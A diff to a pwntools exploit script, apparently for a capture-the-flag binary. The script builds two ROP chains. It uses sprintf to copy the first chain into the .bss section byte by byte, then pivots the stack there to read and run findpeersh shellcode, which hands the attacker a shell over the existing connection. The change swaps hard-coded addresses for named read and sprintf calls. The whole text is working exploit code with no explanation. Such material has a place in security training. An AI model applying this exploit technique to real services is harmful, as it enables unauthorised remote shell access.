@@ -16,11 +16,11 @@ rop2 = ROP(elf)
 buf = elf.bss(0x80)
 shellcode = asm(shellcraft.findpeersh())
 
-rop1.call(0x0804893C, [4, buf+5*4, len(shellcode)])
+rop1.read(4, buf+5*4, len(shellcode))
 rop1.call(buf+5*4)
 
 for n,c in enumerate(rop1.chain()):
-    rop2.call(0x0804887C, [buf+n, elf.search(c).next()])
+    rop2.sprintf(buf+n, elf.search(c).next())
 
 rop2.migrate(buf)
 
